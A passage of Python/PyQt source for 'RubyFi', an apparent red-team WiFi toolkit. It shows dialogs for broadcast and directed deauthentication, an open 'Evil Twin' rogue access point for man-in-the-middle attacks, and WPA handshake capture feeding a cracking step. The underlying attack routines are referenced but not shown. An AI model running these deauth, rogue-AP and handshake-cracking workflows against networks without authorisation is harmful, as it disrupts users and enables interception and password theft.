    
    def stop_scanning(self):
        """Stop the scanning process"""
        if self.scan_thread and self.scan_thread.isRunning():
            self.status_label.setText("🛑 Stopping scan...")
            self.scan_thread.stop()
            self.scan_thread.wait()
            self.on_scan_complete(len(self.clients))
            self.stop_scan_btn.setVisible(False)


    def get_selected_client(self) -> Optional[str]:
        """Return selected client MAC or None"""
        selected = self.client_table.selectedItems()
        if selected:
            row = selected[0].row()
            return self.clients[row]['Station MAC']
        return None


    def start_scanning(self):
        """Start client scanning"""
        self.scan_thread = ClientScanThread(self.interface, self.bssid, int(self.channel))
        self.scan_thread.client_found.connect(self.on_client_found)
        self.scan_thread.scan_complete.connect(self.on_scan_complete)
        self.scan_thread.progress_update.connect(lambda msg: self.status_label.setText(msg))
        self.scan_thread.start()

    def on_client_found(self, client):
        """Add client to table with proper formatting"""
        row = self.client_table.rowCount()
        self.client_table.insertRow(row)
        
        # MAC Address (green color)
        mac_item = QTableWidgetItem(client['Station MAC'])
        mac_item.setForeground(QBrush(QColor(0, 255, 136)))
        self.client_table.setItem(row, 0, mac_item)
        
        # Power (centered)
        pwr_item = QTableWidgetItem(client['Power'])
        pwr_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        pwr_item.setForeground(QBrush(QColor(255, 190, 11)))
        self.client_table.setItem(row, 1, pwr_item)
        
        # Packets (centered)
        pkt_item = QTableWidgetItem(client['# packets'])
        pkt_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        pkt_item.setForeground(QBrush(QColor(201, 209, 217)))
        self.client_table.setItem(row, 2, pkt_item)
        
        self.clients.append(client)


    def on_scan_complete(self, count):
        """Scanning finished"""
        if count == 0:
            self.status_label.setText("❌ No clients found")
        else:
            self.status_label.setText(f"✅ Found {count} client(s)")

        # Hide stop button when scan completes
        if hasattr(self, 'stop_scan_btn'):
            self.stop_scan_btn.setVisible(False)

    def use_broadcast(self):
        """Use broadcast mode (no specific client)"""
        self.selected_client = None
        self.accept()


class DeauthDialog(QDialog):
    """Dialog to select deauth attack type"""
    
    def __init__(self, target_ssid: str, target_bssid: str, target_channel: str, interface: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("⚡ Deauthentication Attack")
        self.setModal(True)
        self.setMinimumSize(500, 300)
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.interface = interface
        self.selected_attack = None
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        # Header
        header = QLabel("⚡ DEAUTHENTICATION ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #ff006e; margin: 15px;")
        layout.addWidget(header)
        
        # Target info
        info_text = f"Target: {self.target_ssid}\nBSSID: {self.target_bssid}\nChannel: {self.target_channel}"
        info_label = QLabel(info_text)
        info_label.setStyleSheet("color: #c9d1d9; margin: 10px; padding: 10px; background: #161b22; border-radius: 6px;")
        layout.addWidget(info_label)
        
        # Options
        attacks = [
            ("🎯 Broadcast Deauth (All Clients)", "broadcast", "#ffbe0b"),
            ("📍 Directed Deauth (Specific Client)", "directed", "#ff006e"),
        ]
        
        for text, attack_id, color in attacks:
            btn = QPushButton(text)
            btn.setMinimumHeight(50)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #21262d;
                    border: 2px solid {color};
                    color: {color};
                    font-size: 13px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 20px;
                    border-radius: 6px;
                }}
                QPushButton:hover {{
                    background: {color};
                    color: #0d1117;
                }}
            """)
            btn.clicked.connect(lambda checked, aid=attack_id: self.select_attack(aid))
            layout.addWidget(btn)
        
        layout.addStretch()
        
        # Cancel button
        cancel_btn = QPushButton("❌ Cancel")
        cancel_btn.clicked.connect(self.reject)
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #161b22;
                border: 2px solid #8b949e;
                color: #8b949e;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #8b949e;
                color: #0d1117;
            }
        """)
        layout.addWidget(cancel_btn)
        
        self.setLayout(layout)

        


    def select_attack(self, attack_id):
        """Handle attack selection"""
        self.selected_attack = attack_id
        self.accept()

class EvilTwinDialog(QDialog):
    """Dialog to select Evil Twin attack mode"""
    def __init__(self, target_ssid: str, target_bssid: str, target_channel: str, interface: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("🎭 Evil Twin Attack")
        self.setModal(True)
        self.setMinimumSize(550, 350)
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.interface = interface
        self.selected_mode = None
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        # Header
        header = QLabel("🎭 EVIL TWIN ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #8338ec; margin: 15px;")
        layout.addWidget(header)
        
        # Target info
        info_text = f"Target: {self.target_ssid}\nBSSID: {self.target_bssid}\nChannel: {self.target_channel}"
        info_label = QLabel(info_text)
        info_label.setStyleSheet("color: #c9d1d9; margin: 10px; padding: 10px; background: #161b22; border-radius: 6px;")
        layout.addWidget(info_label)
        
        # Warning
        warning = QLabel("⚠️ WARNING: Creates rogue AP for MITM attacks!")
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warning.setStyleSheet("color: #ff006e; font-weight: bold; margin: 10px;")
        layout.addWidget(warning)
        
        # Mode selection
        modes = [
            ("🔓 Simple Evil Twin (Open Network + Deauth)", "simple", "#00ff88", 
             "Creates open rogue AP\nClients auto-connect when deauthed"),
            ("🔒 Advanced Evil Twin (WPA2 Fake + Deauth)", "advanced", "#8b949e",
             "Coming soon... (WPA2 rogue AP)")
        ]
        
        for text, mode_id, color, desc in modes:
            btn = QPushButton(text)
            btn.setMinimumHeight(60)
            
            if mode_id == "advanced":
                # Disable advanced mode
                btn.setEnabled(False)
                btn.setStyleSheet(f"""
                    QPushButton {{
                        background: #161b22;
                        border: 2px solid #30363d;
                        color: #8b949e;
                        font-size: 12px;
                        font-weight: bold;
                        text-align: left;
                        padding-left: 20px;
                        border-radius: 6px;
                    }}
                """)
            else:
                btn.setStyleSheet(f"""
                    QPushButton {{
                        background: #21262d;
                        border: 2px solid {color};
                        color: {color};
                        font-size: 12px;
                        font-weight: bold;
                        text-align: left;
                        padding-left: 20px;
                        border-radius: 6px;
                    }}
                    QPushButton:hover {{
                        background: {color};
                        color: #0d1117;
                    }}
                """)
                btn.clicked.connect(lambda checked, mid=mode_id: self.select_mode(mid))
            
            layout.addWidget(btn)
            
            # Add description
            desc_label = QLabel(desc)
            desc_label.setStyleSheet("color: #8b949e; font-size: 10px; margin-left: 30px;")
            layout.addWidget(desc_label)
        
        layout.addStretch()
        
        # Cancel button
        cancel_btn = QPushButton("❌ Cancel")
        cancel_btn.clicked.connect(self.reject)
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #161b22;
                border: 2px solid #8b949e;
                color: #8b949e;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #8b949e;
                color: #0d1117;
            }
        """)
        layout.addWidget(cancel_btn)
    
    def select_mode(self, mode_id):
        """Handle mode selection"""
        self.selected_mode = mode_id
        self.accept()


class RubyFiWindow(BeaconFloodMixin, WiFiPhishingMixin, QMainWindow):
    """Main RubyFi GUI Window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔥 RubyFi - WiFi Security Toolkit")
        self.setGeometry(50, 50, 1400, 900)
        self.setStyleSheet(DARK_THEME)
        
        self.current_interface = None
        self.current_mode = "None"
        self.selected_target = None
        self.scan_thread = None
        
        self.init_ui()
        
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.animate_progress)
        self.progress_value = 0
    
    def init_ui(self):
        """Initialize UI components"""
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setSpacing(10)
        
        # Header banner
        header = QLabel("🔥 RUBYFI - Advanced Red Team WiFi Toolkit 🔥")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("""
            font-size: 24px;
            font-weight: bold;
            color: #ff006e;
            margin: 10px;
            padding: 10px;
            border-bottom: 2px solid #30363d;
        """)
        main_layout.addWidget(header)
        
        # Interface status
        self.interface_status = self.create_interface_status()
        main_layout.addWidget(self.interface_status)
        
        # Toolbar
        toolbar = self.create_toolbar()
        main_layout.addLayout(toolbar)
        
        # Resizable splitter
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.setHandleWidth(3)
        splitter.setStyleSheet("QSplitter::handle { background: #30363d; }")
        
        # Network table
        table_widget = QWidget()
        table_layout = QVBoxLayout(table_widget)
        table_layout.setContentsMargins(0, 0, 0, 0)
        
        table_header = QHBoxLayout()
        table_label = QLabel("📡 Discovered Networks")
        table_label.setStyleSheet("color: #00ff88; font-weight: bold; font-size: 14px;")
        table_header.addWidget(table_label)
        
        self.refresh_btn = QPushButton("🔄 Refresh")
        self.refresh_btn.setMaximumWidth(100)
        self.refresh_btn.clicked.connect(self.start_scan)
        table_header.addWidget(self.refresh_btn)
        
        table_layout.addLayout(table_header)
        
        self.network_table = self.create_network_table()
        table_layout.addWidget(self.network_table)
        
        splitter.addWidget(table_widget)
        
        # Live log
        log_widget = QWidget()
        log_layout = QVBoxLayout(log_widget)
        log_layout.setContentsMargins(0, 0, 0, 0)
        
        log_label = QLabel("📋 Live Activity Log")
        log_label.setStyleSheet("color: #00ff88; font-weight: bold; font-size: 14px;")
        log_layout.addWidget(log_label)
        
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        log_layout.addWidget(self.log_view)
        
        splitter.addWidget(log_widget)
        splitter.setSizes([550, 200])
        
        main_layout.addWidget(splitter)
        
        # Progress bar
        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFormat("Ready")
        self.progress.setTextVisible(True)
        main_layout.addWidget(self.progress)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.update_status()
        
        # Initial log
        self.log("✅ RubyFi GUI initialized successfully")
        self.log("🔧 Start: Manage Interface → Enable Monitor Mode")
        self.log("📡 Then: Scan Networks → Select Target → Launch Attack")
    

    def execute_handshake(self):
        """Called from handle_attack_selection('handshake', ...)."""
        target          = self.selected_target
        target_ssid     = target["ssid"]
        target_bssid    = target["bssid"]
        target_channel  = target["channel"]

        # ── step 1: pick capture mode ────────────────────────────
        dialog = HandshakeModeDialog(
            target_ssid, target_bssid, target_channel,
            self.current_interface, self,
        )
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return
        mode = dialog.selected_mode

        # ── step 2: for manual mode, scan + select a client ──────
        client_mac = None
        if mode == "manual":
            client_dialog = ClientSelectionDialog(
                target_bssid, target_ssid, target_channel,
                self.current_interface, self,
            )
            if client_dialog.exec() != QDialog.DialogCode.Accepted:
                return
            client_mac = client_dialog.get_selected_client()   # None → broadcast

        self.perform_handshake_capture(target, mode, client_mac)

    # ═══════════════════════════════════════════════════════════════
    #  HANDSHAKE CAPTURE — LAUNCH
    # ═══════════════════════════════════════════════════════════════

    def perform_handshake_capture(self, target, mode, client_mac=None):
        """Creates the live stats panel, stop button and background thread."""
        target_ssid    = target["ssid"]
        target_bssid   = target["bssid"]
        target_channel = target["channel"]

        self.log(f"Launching Handshake Capture on {target_ssid} ...")
        self.log(
            f"BSSID: {target_bssid}  |  Channel: {target_channel}"
            f"  |  Mode: {mode.upper()}"
            + (f"  |  Client: {client_mac}" if client_mac else "  |  broadcast")
        )

        try:
            # ── live stats panel ─────────────────────────────────
            self.hs_panel = self._create_hs_panel(
                target_ssid, target_bssid, target_channel, mode
            )

            # ── stop button ──────────────────────────────────────
            self.hs_stop_btn = QPushButton("■  Stop Capture")
            self.hs_stop_btn.setStyleSheet("""
                QPushButton {
                    background: #21262d;
                    border: 2px solid #ffbe0b;
                    color: #ffbe0b;
                    font-weight: bold;
                    padding: 10px;
                    border-radius: 6px;
                }
                QPushButton:hover { background: #ffbe0b; color: #0d1117; }
            """)
            self.hs_stop_btn.clicked.connect(self.stop_handshake)

            # ── insert above the progress bar (same pattern as Evil Twin) ──
            layout = self.centralWidget().layout()
            layout.insertWidget(layout.count() - 2, self.hs_panel)
            layout.insertWidget(layout.count() - 2, self.hs_stop_btn)

            # ── background thread ────────────────────────────────
            self.hs_thread = HandshakeCaptureThread(
                self.current_interface,
                target_bssid, target_ssid, target_channel,
                mode=mode, client_mac=client_mac,
            )
            self.hs_thread.statusupdate.connect(self._hs_on_status)
            self.hs_thread.phasechanged.connect(self._hs_on_phase)
            self.hs_thread.statsupdate.connect(self._hs_on_stats)
            self.hs_thread.handshakefound.connect(self._hs_on_found)
            self.hs_thread.attackcomplete.connect(self._hs_on_complete)
            self.hs_thread.start()

        except Exception as e:
            self.log(f"! Error starting handshake capture: {e}")
            QMessageBox.critical(self, "Error", str(e))

    # ═══════════════════════════════════════════════════════════════
    #  HANDSHAKE CAPTURE — LIVE STATS PANEL BUILDER
    # ═══════════════════════════════════════════════════════════════

    def _create_hs_panel(self, ssid, bssid, channel, mode):
        """Build and return the live handshake status widget."""
        panel = QWidget()
        panel.setStyleSheet("""
            QWidget {
                background: #161b22;
                border: 2px solid #ffbe0b;
                border-radius: 8px;
                padding: 10px;
            }
        """)
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        # ── title ────────────────────────────────────────────────
        title = QLabel("🤝  HANDSHAKE CAPTURE — LIVE")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet(
            "color:#ffbe0b; font-weight:bold; font-size:16px; border:none;"
        )
        layout.addWidget(title)

        # ── target info strip ────────────────────────────────────
        info = QLabel(
            f"  {ssid}   ·   {bssid}   ·   Ch {channel}   ·   {mode.upper()} mode"
        )
        info.setStyleSheet(
            "color:#8b949e; font-size:11px; border:none; margin-bottom:2px;"
        )
        layout.addWidget(info)

        # ── BIG phase label ──────────────────────────────────────
        self.hs_phase_label = QLabel("⚙  SETTING UP")
        self.hs_phase_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.hs_phase_label.setStyleSheet(
            "color:#00b4d8; font-size:22px; font-weight:bold;"
            "background:#0d1117; border-radius:6px; padding:10px;"
            "margin:4px 0; border:1px solid #30363d;"
        )
        layout.addWidget(self.hs_phase_label)

        # ── stats grid ───────────────────────────────────────────
        stats_row = QHBoxLayout()

        def _stat(attr, label_text, colour, init="—"):
            w  = QWidget()
            vl = QVBoxLayout(w)
            vl.setContentsMargins(5, 5, 5, 5)
            val = QLabel(init)
            val.setAlignment(Qt.AlignmentFlag.AlignCenter)
            val.setStyleSheet(
                f"color:{colour}; font-size:26px; font-weight:bold; border:none;"
            )
            desc = QLabel(label_text)
            desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
            desc.setStyleSheet("color:#8b949e; font-size:10px; border:none;")
            vl.addWidget(val)
            vl.addWidget(desc)
            setattr(self, attr, val)
            return w

        stats_row.addWidget(_stat("hs_time_lbl",   "Time Elapsed",  "#ffbe0b", "0s"))
        stats_row.addWidget(_stat("hs_cycles_lbl", "Deauth Cycles", "#ff006e", "0"))
        stats_row.addWidget(_stat("hs_size_lbl",   "Cap File (KB)", "#00b4d8", "0.0"))
        layout.addLayout(stats_row)

        # ── countdown progress bar ───────────────────────────────
        self.hs_countdown = QProgressBar()
        self.hs_countdown.setRange(0, 300)
        self.hs_countdown.setValue(0)
        self.hs_countdown.setFormat("Elapsed: 0s   |   Remaining: 5:00")
        self.hs_countdown.setStyleSheet("""
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                color: #c9d1d9;
                height: 18px;
                text-align: center;
                font-size: 11px;
            }
            QProgressBar::chunk {
                background: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ffbe0b, stop:0.5 #ff006e, stop:1 #8338ec
                );
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.hs_countdown)

        # ── infinite animated spinner bar ────────────────────────
        self.hs_spinner = QProgressBar()
        self.hs_spinner.setRange(0, 0)
        self.hs_spinner.setTextVisible(False)
        self.hs_spinner.setStyleSheet("""
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                height: 6px;
            }
            QProgressBar::chunk {
                background: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ffbe0b, stop:0.4 #ff006e, stop:1 #00ff88
                );
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.hs_spinner)

        # ── mini activity log ────────────────────────────────────
        log_hdr = QLabel("  ACTIVITY LOG")
        log_hdr.setStyleSheet(
            "color:#ffbe0b; font-weight:bold; font-size:11px;"
            "border:none; margin-top:4px;"
        )
        layout.addWidget(log_hdr)

        self.hs_log = QTextEdit()
        self.hs_log.setReadOnly(True)
        self.hs_log.setMaximumHeight(100)
        self.hs_log.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 4px;
                color: #c9d1d9;
                padding: 5px;
                font-family: monospace;
                font-size: 11px;
            }
        """)
        layout.addWidget(self.hs_log)

        return panel

    # ═══════════════════════════════════════════════════════════════
    #  SIGNAL SLOTS
    # ═══════════════════════════════════════════════════════════════

    def _hs_on_status(self, message):
        """Write to both the main log pane and the mini activity log."""
        self.log(message)
        if not hasattr(self, "hs_log"):
            return

        import time as _t
        ts    = _t.strftime("%H:%M:%S")
        lower = message.lower()

        if "success" in lower or "✅" in message or "captured" in lower:
            colour = "#00ff88"
        elif "!" in message or "error" in lower or "fail" in lower or "timeout" in lower:
            colour = "#ff006e"
        elif "deauth" in lower or "cycle" in lower or "⚡" in message:
            colour = "#ffbe0b"
        elif "waiting" in lower or "reconnect" in lower or "🕐" in message:
            colour = "#ffbe0b"
        elif "stabilising" in lower or "passive" in lower or "👁" in message:
            colour = "#00b4d8"
        else:
            colour = "#c9d1d9"

        self.hs_log.append(
            f"<span style='color:{colour};'>[{ts}] {message}</span>"
        )

    def _hs_on_phase(self, text, colour):
        """Update the big phase indicator label."""
        if not hasattr(self, "hs_phase_label"):
            return
        self.hs_phase_label.setText(text)
        self.hs_phase_label.setStyleSheet(
            f"color:{colour}; font-size:22px; font-weight:bold;"
            f"background:#0d1117; border-radius:6px; padding:10px;"
            f"margin:4px 0; border:1px solid {colour};"
        )

    def _hs_on_stats(self, elapsed, cycles, size_kb):
        """Update time, cycles, file size and countdown bar."""
        if hasattr(self, "hs_time_lbl"):
            mins = elapsed // 60
            secs = elapsed % 60
            self.hs_time_lbl.setText(
                f"{mins}m {secs:02d}s" if mins > 0 else f"{elapsed}s"
            )

        if hasattr(self, "hs_cycles_lbl"):
            self.hs_cycles_lbl.setText(str(cycles))

        if hasattr(self, "hs_size_lbl"):
            self.hs_size_lbl.setText(f"{size_kb:.1f}")
            if size_kb > 0:
                self.hs_size_lbl.setStyleSheet(
                    "color:#00ffff; font-size:26px; font-weight:bold; border:none;"
                )
                QTimer.singleShot(
                    400,
                    lambda: hasattr(self, "hs_size_lbl") and
                    self.hs_size_lbl.setStyleSheet(
                        "color:#00b4d8; font-size:26px; font-weight:bold; border:none;"
                    ),
                )

        if hasattr(self, "hs_countdown"):
            remaining = max(0, 300 - elapsed)
            r_m = remaining // 60
            r_s = remaining % 60
            self.hs_countdown.setValue(elapsed)
            self.hs_countdown.setFormat(
                f"Elapsed: {elapsed}s   |   Remaining: {r_m}:{r_s:02d}"
            )

    def _hs_on_found(self, filepath):
        """Flash everything green, freeze spinner, play sound, show popup."""
        # phase label → solid green
        if hasattr(self, "hs_phase_label"):
            self.hs_phase_label.setText("✅  HANDSHAKE CAPTURED!")
            self.hs_phase_label.setStyleSheet(
                "color:#00ff88; font-size:24px; font-weight:bold;"
                "background:#0d1117; border-radius:6px; padding:10px;"
                "margin:4px 0; border:2px solid #00ff88;"
            )

        # freeze spinner → solid green
        if hasattr(self, "hs_spinner"):
            self.hs_spinner.setRange(0, 100)
            self.hs_spinner.setValue(100)
            self.hs_spinner.setStyleSheet("""
                QProgressBar {
                    border: 1px solid #00ff88;
                    border-radius: 4px;
                    background: #0d1117;
                    height: 6px;
                }
                QProgressBar::chunk { background: #00ff88; border-radius: 4px; }
            """)

        # mini log entry
        if hasattr(self, "hs_log"):
            import time as _t
            ts = _t.strftime("%H:%M:%S")
            self.hs_log.append(
                f"<span style='color:#00ff88; font-weight:bold;'>"
                f"[{ts}] ✅  SAVED → {filepath}</span>"
            )

        self.log(f"✅ Handshake saved: {filepath}")

        # notification sound
        try:
            import subprocess as _sp
            _sp.Popen(
                ["paplay", "/usr/share/sounds/freedesktop/stereo/complete.oga"],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
            )
        except Exception:
            pass

        QMessageBox.information(
            self,
            "✅  Handshake Captured!",
            f"WPA Handshake saved to:{filepath}"
            "Go to  Password Cracking  to crack it!",
        )

    def _hs_on_complete(self, success, message):
        """Final signal. If failed, show the failure state."""
        if not success:
            self.log(f"Handshake capture ended: {message}")
            if hasattr(self, "hs_phase_label"):
                self.hs_phase_label.setText("❌  NO HANDSHAKE")
                self.hs_phase_label.setStyleSheet(
                    "color:#8b949e; font-size:20px; font-weight:bold;"
                    "background:#0d1117; border-radius:6px; padding:10px;"
                    "margin:4px 0; border:1px solid #8b949e;"
                )
            if hasattr(self, "hs_spinner"):
                self.hs_spinner.setRange(0, 100)
                self.hs_spinner.setValue(0)
        self._hs_cleanup_ui()

    # ═══════════════════════════════════════════════════════════════
    #  STOP / CLEANUP
    # ═══════════════════════════════════════════════════════════════

    def stop_handshake(self):
        """Stop button handler."""
        if hasattr(self, "hs_thread") and self.hs_thread.isRunning():
            self.log("Stopping Handshake Capture ...")
            self.hs_thread.stop()
            self.hs_thread.wait()
            self.log("Capture stopped.")
        self._hs_cleanup_ui()

    def _hs_cleanup_ui(self):
        """Remove the stats panel and stop button from the layout."""
        for attr in ("hs_panel", "hs_stop_btn"):
            if hasattr(self, attr):
                getattr(self, attr).deleteLater()
                delattr(self, attr)
        for attr in (
            "hs_phase_label", "hs_time_lbl", "hs_cycles_lbl",
            "hs_size_lbl", "hs_countdown", "hs_spinner", "hs_log",
        ):
            if hasattr(self, attr):
                delattr(self, attr)



    def create_interface_status(self):
        """Create interface status widget"""
        widget = QWidget()
        widget.setStyleSheet("""
            QWidget {
                background: #161b22;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding: 10px;
            }
        """)
        layout = QHBoxLayout(widget)
        
        self.iface_label = QLabel("🔌 Interface: Not Selected")
        self.target_label = QLabel("🎯 Target: None")
        
        for label in [self.iface_label, self.target_label]:
            label.setStyleSheet("color: #c9d1d9; font-size: 13px; font-weight: bold;")
        
        layout.addWidget(self.iface_label)
        layout.addStretch()
        layout.addWidget(self.target_label)
        
        return widget
    
    def create_toolbar(self):
        """Create toolbar with buttons"""
        toolbar = QHBoxLayout()
        
        buttons = [
            ("🔧 Manage Interface", self.manage_interface, "#8338ec"),
            ("📡 Scan Networks", self.start_scan, "#00ff88"),
            ("⚔️ Launch Attack", self.launch_attack, "#ff006e"),
            ("🔓 Crack", self.crack_password, "#00b4d8"),
        ]
        
        for text, callback, color in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(callback)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #21262d;
                    border: 2px solid {color};
                    color: {color};
                    font-weight: bold;
                    padding: 10px 15px;
                    border-radius: 8px;
                }}
                QPushButton:hover {{
                    background: {color};
                    color: #0d1117;
                }}
            """)
            toolbar.addWidget(btn)
        
        return toolbar
    
    def create_network_table(self):
        """Create network table"""
        table = QTableWidget()
        table.setColumnCount(7)
        table.setHorizontalHeaderLabels([
            "NUM", "SSID", "BSSID", "CH", "PWR", "ENCRYPTION", "CLIENTS"
        ])
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(6, QHeaderView.ResizeMode.ResizeToContents)
        
        table.verticalHeader().setVisible(False)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.itemSelectionChanged.connect(self.on_target_selected)
        
        return table
    
    def add_network_to_table(self, network):
        """Add network to table"""
        row = self.network_table.rowCount()
        self.network_table.insertRow(row)
        
        if network['is_5ghz']:
            text_color = QColor(135, 206, 250)
        else:
            text_color = QColor(201, 209, 217)
        
        if network['wps']:
            text_color = QColor(255, 190, 11)
        
        # NUM
        num_item = QTableWidgetItem(f"[{row + 1}]")
        num_item.setForeground(QBrush(QColor(139, 148, 158)))
        num_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.network_table.setItem(row, 0, num_item)
        
        # SSID
        ssid_item = QTableWidgetItem(network['ssid'])
        ssid_item.setForeground(QBrush(text_color))
        ssid_item.setFont(QFont("Ubuntu", 10, QFont.Weight.Bold))
        self.network_table.setItem(row, 1, ssid_item)
        
        # BSSID
        bssid_item = QTableWidgetItem(network['bssid'])
        bssid_item.setForeground(QBrush(QColor(139, 148, 158)))
        self.network_table.setItem(row, 2, bssid_item)
        
        # Channel
        ch_item = QTableWidgetItem(network['channel'])
        ch_item.setForeground(QBrush(text_color))
        ch_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.network_table.setItem(row, 3, ch_item)
        
        # Power
        pwr_item = QTableWidgetItem(network['power'])
        pwr_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        try:
            pwr_val = int(network['power'])
            if pwr_val > -50:
                pwr_color = QColor(0, 255, 136)
            elif pwr_val > -70:
                pwr_color = QColor(255, 190, 11)
            else:
                pwr_color = QColor(255, 0, 110)
            pwr_item.setForeground(QBrush(pwr_color))
        except:
            pwr_item.setForeground(QBrush(QColor(139, 148, 158)))
        self.network_table.setItem(row, 4, pwr_item)
        
        # Encryption
        enc_item = QTableWidgetItem(network['encryption'])
        enc_item.setForeground(QBrush(text_color))
        self.network_table.setItem(row, 5, enc_item)
        
        # Clients
        cli_item = QTableWidgetItem(network.get('clients', '0'))
        cli_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        cli_color = QColor(0, 255, 136) if network.get('clients', '0') != '0' else QColor(255, 0, 110)
        cli_item.setForeground(QBrush(cli_color))
        self.network_table.setItem(row, 6, cli_item)
        
        # Store data
        self.network_table.item(row, 0).setData(Qt.ItemDataRole.UserRole, network)
    
    def on_target_selected(self):
        """Handle target selection"""
        selected = self.network_table.selectedItems()
        if selected:
            row = selected[0].row()
            network = self.network_table.item(row, 0).data(Qt.ItemDataRole.UserRole)
            self.selected_target = network
            ssid = network['ssid']
            self.target_label.setText(f"🎯 Target: {ssid}")
            self.log(f"🎯 Target selected: {ssid} ({network['bssid']}) on CH {network['channel']}")
    
    def log(self, message):
        """Add log with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_view.append(f"[{timestamp}] {message}")
        scrollbar = self.log_view.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def update_status(self):
        """Update status bar"""
        mode_text = self.current_mode if self.current_mode != "None" else "Not Ready"
        iface_text = self.current_interface if self.current_interface else "None"
        self.status_bar.showMessage(f"Interface: {iface_text} │ Mode: {mode_text} │ Ready")
    
    def animate_progress(self):
        """Smooth progress animation"""
        self.progress_value = (self.progress_value + 2) % 100
        self.progress.setValue(self.progress_value)
    
    # Action handlers
    
    def manage_interface(self):
        """Open interface dialog"""
        dialog = InterfaceDialog(self)
        dialog.interface_changed.connect(self.on_interface_changed)
        dialog.exec()
    
    def on_interface_changed(self, interface, mode):
        """Handle interface change"""
        self.current_interface = interface
        self.current_mode = mode
        mode_color = "#00ff88" if mode == "Monitor" else "#ff006e"
        self.iface_label.setText(f"🔌 Interface: {interface} ({mode})")
        self.update_status()
        self._apply_interface(interface, mode)
        self.log(f"✅ Interface: {interface} ({mode})")
    
    def start_scan(self):
        """Start or stop network scan"""
        # If already scanning, stop it
        if self.scan_thread and self.scan_thread.isRunning():
            self.log("🛑 Stopping scan...")
            self.scan_thread.stop()
            self.scan_thread.wait()
            self.scan_thread = None
            self.refresh_btn.setText("🔄 Refresh")
            self.refresh_btn.setStyleSheet("""
                QPushButton {
                    background: #21262d;
                    border: 2px solid #00ff88;
                    color: #00ff88;
                    font-weight: bold;
                    padding: 8px 12px;
                    border-radius: 6px;
                }
                QPushButton:hover {
                    background: #00ff88;
                    color: #0d1117;
                }
            """)
            return
        
        # Check monitor mode
        if not self.current_interface or self.current_mode != "Monitor":
            self.log("❌ Enable monitor mode first!")
            QMessageBox.warning(self, "Monitor Mode Required",
                "Please enable monitor mode via 'Manage Interface' first.")
            self.manage_interface()
            return
        
        # Start new scan
        self.log(f"🚀 Starting scan on {self.current_interface}...")
        self.log("💡 Click 'Stop Scanning' button to stop")
        self.network_table.setRowCount(0)  # Clear old results
        self.progress.setValue(0)
        self.progress.setFormat("Scanning... 0%")
        
        # Change button to "Stop"
        self.refresh_btn.setText("⏹️ Stop Scanning")
        self.refresh_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #ff006e;
                color: #ff006e;
                font-weight: bold;
                padding: 8px 12px;
                border-radius: 6px;
            }
            QPushButton:hover {
